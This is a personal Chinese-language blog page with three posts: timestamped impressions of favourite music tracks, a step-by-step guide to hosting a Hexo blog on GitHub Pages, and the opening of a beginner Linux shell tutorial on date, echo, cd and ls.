    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Daily/ff41d015749c.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Daily/ff41d015749c.html" class="post-title-link" itemprop="url">【Music#0x01】纯个人向音乐鉴赏与推荐</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-17 16:05:26" itemprop="dateCreated datePublished" datetime="2023-09-17T16:05:26+08:00">2023-09-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-04-17 14:40:17" itemprop="dateModified" datetime="2024-04-17T14:40:17+08:00">2024-04-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Daily/" itemprop="url" rel="index"><span itemprop="name">Daily</span></a>
                </span>
            </span>

          
            <span id="/Daily/ff41d015749c.html" class="post-meta-item leancloud_visitors" data-flag-title="【Music#0x01】纯个人向音乐鉴赏与推荐" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Daily/ff41d015749c.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Daily/ff41d015749c.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本人对音乐、乐理、电音制作等知识皆一窍不通，就是个臭打鼓的。因此本条博客是一个<strong>纯个人向</strong>音乐鉴赏与推荐！</p>
<h3 id="Glitched-Universe-削除"><a href="#Glitched-Universe-削除" class="headerlink" title="Glitched Universe - 削除"></a>Glitched Universe - 削除</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=2080462661&userid=127208986">网易云</a><br>评语：世界纷繁错乱，但令人心潮澎湃的心愿永远存在。</p>
</blockquote>
<p><strong>[0:00 - 0:37 Build Up]</strong></p>
<p>从空灵的女声开始，不断快速切入各种声部，包括富有动感的DnB鼓，极光般的弦乐，更具Glitch色彩的音效……然后在最后一小节提前爆发切入DROP！</p>
<p><strong>[0:37 - 0:55 DROP]</strong></p>
<p>宇宙，<strong>世界的绚烂</strong>。背景中心电图般爬升而又落下的像素音，坚定的女声与电声主旋律（这个lead我很喜欢），共同构成了这一副<strong>绚烂</strong>的图景！<br>（我真的很喜欢绚烂这个词）</p>
<p><strong>[0:55 - 1:00]</strong></p>
<p>DROP同样在最后一小节提前结束切入下段，但没有给人任何的失落感，而是让前后的衔接更加紧密，真是优秀的设计！这里是一个激烈的过渡段，用劲爆的节奏来为DROP收尾。</p>
<p><strong>[1:00 - 1:24]</strong></p>
<p>一个铺垫段，glitch噪音一直在耳边回响。电声乐器重复着变强又破碎（glitch音）的过程，好似恒星爆发又突然时光倒带。</p>
<p><strong>[1:24 - 2:07 Build UP]</strong></p>
<p>在刚才的基础上，似乎有了些规则的出现。glitch噪音不再是噪音，而是如同01的数据流一般；同时引入了些许钢琴旋律。</p>
<p>随后，又引入了心电图般爬升而又落下的像素音，以及隐隐约约渐强的DnB鼓。同时，lead变为了带一些glitch的像素音。情绪逐渐加强!</p>
<p><strong>[2:07 - 2:13]</strong></p>
<p>在我以为正要进入DROP时，旋律和节奏都突然停下了，取而代之的是一个持续的Glitch BASS。这时我仿佛来到了空旷无人的宇宙中，不见空间也不见时间。<br>随着BASS逐渐加强，流星般落下的音效出现，时间和空间逐渐回归。然后，在最后一小节提前切入——</p>
<p><strong>[2:13 - 2:51 DROP]</strong></p>
<p>整首曲子情感的爆发，重复了两遍的DROP让人感动。<br>再一次见证<strong>世界的绚丽</strong>。</p>
<p><strong>[2:51 - 3:00]</strong></p>
<p>再次以激烈的节奏与电音为整首曲子收尾，让人意犹未尽，仍想再度踏上这次旅程。</p>
<h3 id="Holy-Night-Silent-Night-Dachs"><a href="#Holy-Night-Silent-Night-Dachs" class="headerlink" title="Holy Night, Silent Night - Dachs"></a>Holy Night, Silent Night - Dachs</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=526904317&userid=127208986">网易云</a><br>风格：trance<br>评语：神一般的间奏，让人感动，和专辑封面一样美哭</p>
</blockquote>
<p><strong>[0:00 - 2:30]</strong></p>
<p>开头仿佛是令人安心的冬夜，快要过圣诞了。抬头便可看到繁星流转于夜空。</p>
<p><strong>[2:30 - 3:15 breakdown]</strong></p>
<p>静谧的夜。情绪慢慢变得柔和，音乐逐渐无声……<br>柔和的钢琴响起，伴随着弦乐，仿佛回忆往昔时光，有着淡淡的伤感。</p>
<p><strong>[3:15 - 3:56]</strong></p>
<p>有力的钢琴伴随着诸多交响乐器逐渐加强，我们从回忆走出，镜头切换到身前，我们仿佛看到了奇迹——或是久别重逢、或者找回信仰。</p>
<p><strong>[3:56 - 5:29]</strong></p>
<p>极富力量感和动感的电音lead乐器将我们带回了现实，尽管主题是重复的，但这时的情感已经和 breakdown 之前不同了，这夜晚变得更加深沉。</p>
<p><strong>[5:29 - 6:29 Epilogue]</strong></p>
<p>尾声。</p>
<h3 id="Noctambule-＊-Teris"><a href="#Noctambule-＊-Teris" class="headerlink" title="Noctambule - ＊-Teris."></a>Noctambule - ＊-Teris.</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=1974436463&userid=127208986">https://music.163.com/song?id=1974436463&amp;userid=127208986</a><br>风格：garage house&#x2F;jazz</p>
</blockquote>
<p>一听到前奏就收藏了，感觉独特的jazz风电子音乐，处理地特别特别干净，作者太懂留白了。很多留白出会插入意想不到的乐器，有bass、有8-bit风电子乐器等等……</p>
<p>不过我最喜欢的还是 **[2:01 - 3:01]**，有种梦幻的感觉。</p>
<h3 id="Random-Access-Memories-Daft-Punk"><a href="#Random-Access-Memories-Daft-Punk" class="headerlink" title="Random Access Memories - Daft Punk"></a>Random Access Memories - Daft Punk</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/album?id=165455240&userid=127208986">https://music.163.com/album?id=165455240&amp;userid=127208986</a><br>风格：电子音乐</p>
</blockquote>
<p>真的神专，每一首都值得反复听。随便挑一首特别喜欢的出来：Giorgio by Moroder，一首由采访起手的音乐，后面有点Trance的感觉，一步步铺垫情感，我就是被Trance给害了。<br>尤其是第一段落结束后（ <strong>[4:59 - 5:15]</strong> ），在Giorgio说出：</p>
<blockquote>
<p>Once you free your mind about a concept of harmony and of music being ‘correct’,<br>you can do whatever you want.<br>So nobody told me what to do, and there was no preconception of what to do.</p>
</blockquote>
<p>之后，突然进了弦乐（ <strong>[5:15 - 5:49]</strong> ），尽情表现着星空下的自由，然后主题再次回归，搭配弦乐，谁听了不会感动！</p>
<p>除了这段外，还有一个我很喜欢的细节——搓碟的声音和鼓的声音非常搭配地重叠在一起，非常独特的听感。<br>总之，我所说的神专，之所以是神，是因为它能带给我独特的体验，我相信它也能给其他听众带来不同的体验，所以大家都快去听。</p>
<h3 id="干杯-五月天"><a href="#干杯-五月天" class="headerlink" title="干杯 - 五月天"></a>干杯 - 五月天</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://music.163.com/song?id=22197007&userid=127208986">网易云</a><br>评语：神MV。和时间、人生有关的歌总是特别吸引人，7 years也是这样。</p>
</blockquote>
<p>不剧透了，快去看MV！<br>唯一的缺陷就是音域太广了，我实在唱不了，不然每次KTV都要唱这首555</p>
<h3 id="from-Y-to-Y-乐队演奏-ろじえも"><a href="#from-Y-to-Y-乐队演奏-ろじえも" class="headerlink" title="from Y to Y (乐队演奏) - ろじえも"></a>from Y to Y (乐队演奏) - ろじえも</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Sx411A7Lv">Bilibili</a><br>评语：神作，治愈系，给人以力量</p>
</blockquote>
<p>鼓手对强弱的掌控实在是太好了，这样的演奏就好像是<strong>完美</strong>的，让人觉得这里就是这样最好，没别的更好了。<br>中间一段听得鸡皮疙瘩都起来了，impressive orz，本家和演奏都是绝对的神作。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Blog/0cc0b8050646.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Blog/0cc0b8050646.html" class="post-title-link" itemprop="url">【Blog#0x02】个人博客搭建：基于hexo+github pages</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-25 23:50:52" itemprop="dateCreated datePublished" datetime="2023-06-25T23:50:52+08:00">2023-06-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:24" itemprop="dateModified" datetime="2024-01-11T16:34:24+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Blog/" itemprop="url" rel="index"><span itemprop="name">Blog</span></a>
                </span>
            </span>

          
            <span id="/Tech/Blog/0cc0b8050646.html" class="post-meta-item leancloud_visitors" data-flag-title="【Blog#0x02】个人博客搭建：基于hexo+github pages" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Blog/0cc0b8050646.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Blog/0cc0b8050646.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>你是否看到朋友开了微信公众号觉得很酷？你是否想分享自己的学习笔记、生活感想？你是否想拥有自己的个人主页？</p>
<p>那就一起来试试整个博客吧，反正是免费的不用花钱（&lt;ゝω・）☆</p>
<p>方便起见，推荐在自己主系统上面配置博客，或者配置在WSL上。</p>
<h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>请参考<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">官方文档 | Hexo</a>，Windows安装Git时，全程保持默认选项即可。</p>
<p>注意，其中命令行指令需要在你安装系统的shell上执行。如果是Windows系统的话，需要使用刚刚安装的Git所附带的Git Bash。</p>
<h2 id="静态网站生成"><a href="#静态网站生成" class="headerlink" title="静态网站生成"></a>静态网站生成</h2><p>首先，在你电脑上挑一个喜欢的位置，我们会在这里存放博客的文件夹。</p>
<p>然后打开命令行，在这里输入（把 <code>&lt;folder&gt;</code> 替换成你想要的文件夹名）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt;</span><br><span class="line">$ <span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>

<p>完成后，这个目录的文件树如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── <span class="built_in">source</span></span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure>

<p>其中，比较重要的是配置文件 <code>_config.yml</code> 以及存放用户资源（文章、图片）的 <code>source</code> 文件夹。</p>
<p>接下来我们试着创建一篇文章，在当前目录下输入 <code>hexo new &lt;artical_name&gt;</code> （将 <code>&lt;article_name&gt;</code> 替换为你想要的博客标题），hexo会帮你在 <code>source/_posts/</code> 目录生成一个新的文本文件。</p>
<p>接下来，用你喜欢的文本编辑器（或者markdown编辑器）打开这个文件，就可以使用markdown的语法来写文章啦！如果你之前没有接触过markdown的语法，可以参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/111833946">一看就懂的Markdown入门语法笔记（整理自Markdown cheat sheet） - 知乎</a>，说是语法其实就是普通的txt文本文件加上一些特殊的标记，特别简洁。</p>
<blockquote>
<p>我校树洞也支持md语法，比如在一行字前面加上 <code>#</code> 和一个空格，就能够让它变特别大（一级标题）。</p>
</blockquote>
<p>在编辑完成后，在命令行中输入指令 <code>hexo g</code>（g表示generate），hexo会根据当前的主题，将你写的文章转换成一个网页。然后我们再输入指令 <code>hexo s</code>（s表示server），hexo就会启动一个本地的web服务器，访问它给出的链接，就可以看到你的崭新的博客以及你刚写的一篇文章啦！</p>
<p>不过，这只是在本地的网站。接下来，我们会借助github提供的网站托管服务，将我们的网站发布在全球互联网上。</p>
<h2 id="仓库配置"><a href="#仓库配置" class="headerlink" title="仓库配置"></a>仓库配置</h2><p>首先，你需要注册一个自己的github账号，记得取一个好记简洁的名字，因为github pages的默认域名就是你的名字。（之后也可以改）</p>
<p>之后我们会需要向github服务器提交我们的博客网站代码，而这背后是hexo通过git来完成的，git又会通过SSH来完成与github服务器的通信。配置属于你的SSH密钥，可以参考Github的官方教程<a target="_blank" rel="noopener" href="https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent">Generating a new SSH key and adding it to the ssh-agent - GitHub Docs</a>。我们生成ed25519算法的key就可以。</p>
<p>在生成并配置好你的密钥后，我们需要将公钥上传到你的github账户上。我们需要在github网站上，点击右上角的头像，找到Settings，然后在左边找到 SSH and GPG keys，点击 New SSH key。</p>
<p>然后我们需要 <code>cat ~/.ssh/id_ed25519.pub</code> ，将其中的内容复制到Key那里，并在Title那里为这个Key取一个名字。然后回到命令行，输入 <code>ssh -T git@github.com</code>，然后输入yes，看提示信息即可确认你有没有成功添加。</p>
<p>之后，我们还需要配置以下git的全局的个人信息，这样你在git提交代码时就会显示你的信息了。如果你用git和别人合作码代码，某次提交出了问题大家就知道应该拷打谁了。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;cameudis&quot;</span>			// 你的用户名</span><br><span class="line">$ git config --global user.email  <span class="string">&quot;xxx@xxx.com&quot;</span>		// 你的邮箱</span><br></pre></td></tr></table></figure>

<p>然后登上Github网页端，创建一个新的仓库，名字一定要设置为 <code>你的用户名.github.io</code>，权限选择公开。比如我的github用户名是Cameudis，我的仓库就名为 <code>Cameudis.github.io</code>，我的博客网址就会是 <code>https://cameudis.github.io/</code> （网址URL是大小写无关的）。</p>
<p>创建完毕后，打开你的博客文件夹中的配置文件 <code>_config.yml</code>，翻到最底下，把deploy的配置改成这样：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/&lt;username&gt;/&lt;project&gt;</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">gh-pages</span></span><br></pre></td></tr></table></figure>

<p>然后在博客文件夹中输入 <code>npm install hexo-deployer-git --save</code>，安装一键部署插件。安装完毕后，直接输入 <code>hexo d</code>（d表示deploy），就可以将hexo生成好的网站上传到github上。之后更新了文章或博客配置，就可以先用 <code>hexo g</code> 生成，用 <code>hexo s</code> 来本地预览，然后用 <code>hexo d</code> 来上传到Github。</p>
<p>注意：有一些功能需要先使用 <code>hexo clean</code> 来将当前生成的网站清空，然后再重新 <code>hexo g</code> 生成。如果你疑惑你的更改怎么没有生效（比如换主题的时候），就可以clean之后再试试。</p>
<p>等待一分钟左右的时间，你就能在属于你的链接上看到属于你的网站了！如果等不及的话，可以在你的博客的github仓库中选择Actions查看部署进度。</p>
<h2 id="后续探索"><a href="#后续探索" class="headerlink" title="后续探索"></a>后续探索</h2><p>拥有自己的博客，一大乐趣就是折腾主题、折腾配置，把自己的网站变成想要的样子。</p>
<p>在<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/configuration">官方的配置教学</a>中，有着对于 <code>_config.yml</code> 文件的说明。</p>
<p>除此以外，很多东西都在官方的文档中有着说明，推荐都看看。比如如何插入图片就可以查看<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/asset-folders.html">资源文件夹 | Hexo</a></p>
<p>我使用的主题是Butterfly（进行了一点魔改），安装、配置请看这里：<a target="_blank" rel="noopener" href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安裝文檔(一) 快速開始</a>。</p>
<p>我使用的评论插件是Valine，教程请参考<a target="_blank" rel="noopener" href="https://cameudis.github.io/Tech/Blog/b9325487ff4b.html">使用Valine给Hexo博客添加评论功能 | Cameudis’s Blog</a></p>
<p>可以使用hexo-blog-encrypt来对某些文章加上密码，教程请看<a target="_blank" rel="noopener" href="https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md">hexo-blog-encrypt&#x2F;ReadMe_zh</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Linux/dd5a3c9cd555.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Linux/dd5a3c9cd555.html" class="post-title-link" itemprop="url">【Linux#0x00】Shell入门</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-25 20:46:35" itemprop="dateCreated datePublished" datetime="2023-06-25T20:46:35+08:00">2023-06-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:24" itemprop="dateModified" datetime="2024-01-11T16:34:24+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          
            <span id="/Tech/Linux/dd5a3c9cd555.html" class="post-meta-item leancloud_visitors" data-flag-title="【Linux#0x00】Shell入门" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Linux/dd5a3c9cd555.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Linux/dd5a3c9cd555.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本教程初次编写于六星2023CTF夏令营，升级后作为Linux系列教程的第零篇。<br>欢迎对Linux毫无了解的读者通过本教程入门Linux命令行基础操作~</p>
<h2 id="What-is-Shell"><a href="#What-is-Shell" class="headerlink" title="What is Shell?"></a>What is Shell?</h2><p>Shell的中文是壳，读者可能听说过一部叫做《Ghost in The Shell》（攻壳机动队）的作品。</p>
<p><img src="https://makia.la/wp-content/uploads/2021/11/Ghost-in-the-Shell-pelicula-resena-4.jpg" alt="Ghost-in-the-Shell"></p>
<p>在计算机的世界中，Shell指的是一类软件，允许用户和计算机进行交互。</p>
<blockquote>
<p>In <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Computing">computing</a>, a <strong>shell</strong> is a computer program that exposes an <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Operating_system">operating system</a>‘s services to a human user or other programs. In general, operating system shells use either a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Command-line_interface">command-line interface</a> (CLI) or <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Graphical_user_interface">graphical user interface</a> (GUI), depending on a computer’s role and particular operation. It is named a shell because it is the outermost layer around the operating system.</p>
<p>—WikiPedia</p>
</blockquote>
<p>在远古时期，我们没有鼠标，也没有图形化界面。那时候，我们就使用键盘来给计算机发送信息，而计算机就通过只能显示文字的显示屏来给我们显示信息。（当然，更远古的时期我们有的只是打孔纸带）这个能够读取我们命令，从而允许我们操作电脑、打开程序、移动文件的程序，就叫做Shell。这是计算机的Shell，也是我们自己在宽广的网络世界中的Shell。</p>
<p>在现在，Shell，尤其是 <strong>CLI Shell</strong>（Command-Line Interface Shell，命令行shell），依然在计算机世界中发光发热，为广大CSer提供着基础、方便、强大的与计算机的交互手段。尽管我们已经有了简洁直观的GUI（Graphical User Interface，图形用户界面）、智能的语音输入、甚至酷炫的Apple Vision Pro等AR&#x2F;VR设备，但这些交互方式的强大之处也正是其缺陷——它们限制了我们的自由，让我们只能按照给定的接口与设备进行交互。</p>
<p>这个教程将会已Kali系统为例（当然其他发行版也适用本教程），讲解Linux系统的shell基础。</p>
<h2 id="使用shell"><a href="#使用shell" class="headerlink" title="使用shell"></a>使用shell</h2><p>所有的Linux系统都会预装一个Shell，而这些Shell的语法都是类似的，差别大部分在于一些拓展功能。比如在Ubuntu等系统上，默认的shell是 <code>bash</code>，而Kali系统上，预装的Shell叫做 <code>zsh</code> 。</p>
<p>当你打开你的Shell程序，你会看到一个提示符（prompt），表示 <em>请您输入指令</em>，比如：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ </span><br></pre></td></tr></table></figure>

<p>本教程之后会使用 <code>$</code> 代指这个提示符。</p>
<p>在shell程序的可执行文件中，其实是一系列字符串处理的代码，负责将我们输入的字符串解析成指令来执行。比如，我们可以输入data：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">date</span></span><br><span class="line">Fri 10 Jan 2020 11:49:31 AM EST</span><br></pre></td></tr></table></figure>

<p>shell 解析我们输入的字符串 <code>&quot;date&quot;</code> ，发现用户想要获取时间，于是就打印出了当前时间。</p>
<p>我们再试试输入 <code>echo hello</code>：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> hello</span><br><span class="line">hello</span><br></pre></td></tr></table></figure>

<p>shell 解析我们输入的字符串 <code>&quot;echo hello&quot;</code> ，根据空格来分割出两个token：<code>echo</code> 以及 <code>token</code>。</p>
<p>然后 shell 将第一个token解析成指令，后面token都解析成参数。它发现我们是要求回声（echo），于是就调用相应的代码，将我们传给它的第二个token <code>hello</code> 打给了我们。</p>
<p>那我们都有哪些可以用的指令呢？我们可以用的指令大概有两种：</p>
<ul>
<li>shell自己代码实现的指令</li>
<li>计算机上的程序</li>
</ul>
<p>如果shell发现我们输入的指令并不是它自己实现的，它就会认为这是一个计算机上的程序。如果它在计算机上找不到这个程序的话，就会报错：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ Genshin start!</span><br><span class="line">Genshin: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<h3 id="Where-am-I-：文件系统"><a href="#Where-am-I-：文件系统" class="headerlink" title="Where am I?：文件系统"></a>Where am I?：文件系统</h3><p>我们知道，计算机里的文件一般是以文件夹的形式组织起来的。在Windows下，我们可以看到C盘这个”大文件夹“下面有着 <code>Program Files</code>, <code>Users</code> 等等文件夹，在其中又有着许多许多的文件夹……</p>
<p>如果我们把C盘当作树根，文件夹当作树枝，文件当作树叶，我们可以发现这不就是一棵树吗！在Linux文件系统中，真的有这么一个目录，就叫做根目录（root directory），其符号为 <code>/</code>。</p>
<p>想要看看Linux的文件树上都有哪些枝叶吗？让我们先走到树根那里：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">cd</span> / </span><br><span class="line">┌──(kali㉿kali)-[/]</span><br><span class="line">└─$ </span><br></pre></td></tr></table></figure>

<p>我们可以使用 <code>cd</code> 指令，其全称是 change directory。在shell中输入 <code>cd /</code> 之后，我们会发现prompt有一定的变化。（这很像<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Multi-user_dungeon">MUD</a>，一种的远古文字游戏）</p>
<p>有一个 <code>~</code> 符号变成了 <code>/</code>，这表示我们的位置已经到了树根这里。这里有什么呢？</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/]</span><br><span class="line">└─$ <span class="built_in">ls</span></span><br><span class="line">bin   home            lib32       media  root  swapfile  var</span><br><span class="line">boot  initrd.img      lib64       mnt    run   sys       vmlinuz</span><br><span class="line">dev   initrd.img.old  libx32      opt    sbin  tmp       vmlinuz.old</span><br><span class="line">etc   lib             lost+found  proc   srv   usr</span><br></pre></td></tr></table></figure>

<p>我们可以看到这里有很多东西，这是不同Linux发行版都会有的约定，也就是什么东西放在哪里。接下来我尝试用cd和ls结合回到家目录。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/]</span><br><span class="line">└─$ <span class="built_in">cd</span> home</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/home]</span><br><span class="line">└─$ <span class="built_in">ls</span>     </span><br><span class="line">kali</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[/home]</span><br><span class="line">└─$ <span class="built_in">cd</span> kali</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$</span><br></pre></td></tr></table></figure>

<p>我们发现，在prompt上显示的位置又回到了 <code>~</code>。</p>
<p>我们进入（回到）这个文件夹时，顺序依次是 <code>/</code> <code>home</code> <code>kali</code>，因此可以把这个拼接成其绝对地址 <code>/home/kali</code>。</p>
